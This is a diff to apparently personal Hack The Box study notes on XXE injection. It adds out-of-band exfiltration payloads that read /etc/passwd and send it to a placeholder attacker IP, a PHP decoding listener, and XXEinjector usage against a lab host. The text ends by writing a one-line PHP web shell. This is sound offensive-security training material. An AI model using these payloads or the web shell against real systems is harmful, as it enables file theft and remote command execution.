@@ -118,8 +118,8 @@
     <!ENTITY joined "%begin;%file;%end;">
     ```
     ```bash
-    abdeonix@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
-    abdeonix@htb[/htb]$ python3 -m http.server 8000
+    echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+    python3 -m http.server 8000
 
     Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
     ```
@@ -152,12 +152,78 @@
     %error;
     ]>
     ```
+
+- **Out-of-band Data Exfiltration**
+    - We can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it.
+    - Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:
+    ```xml
+    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+    <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+    ```
+    - We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
+    ```php
+    <?php
+    if(isset($_GET['content'])){
+        error_log("\n\n" . base64_decode($_GET['content']));
+    }
+    ?>
+    ```
+    ```bash
+    nano index.php # here we write the above PHP code
+    php -S 0.0.0.0:8000
+
+    PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+    ```
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE email [ 
+    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+    %remote;
+    %oob;
+    ]>
+    <root>&content;</root>
+    ```
+
+> [!TIP]
+> In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. 
+
+- **Automated OOB Exfiltration**
+    ```bash
+    git clone https://github.com/enjoiz/XXEinjector.git
+    ```
+    - Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:
+    ```http
+    POST /blind/submitDetails.php HTTP/1.1
+    Host: 10.129.201.94
+    Content-Length: 169
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+    Content-Type: text/plain;charset=UTF-8
+    Accept: */*
+    Origin: http://10.129.201.94
+    Referer: http://10.129.201.94/blind/
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9
+    Connection: close
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    XXEINJECT
+    ```
+    - Now, we can run the tool with the `--host/--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
+    ```bash
+    ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+    ...SNIP...
+    [+] Sending request with malicious XML.
+    [+] Responding with XML for: /etc/passwd
+    [+] Retrieved data:
+
     
-
-
+    cat Logs/10.129.201.94/etc/passwd.log 
+    ```
+    - 
 ### Remote Code Execution 
 - This exploit requires the PHP expect module to be installed and enabled.
-- If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as expect://id, and the page should print the command output
+- If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output
 - However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.
 ```bash
 echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
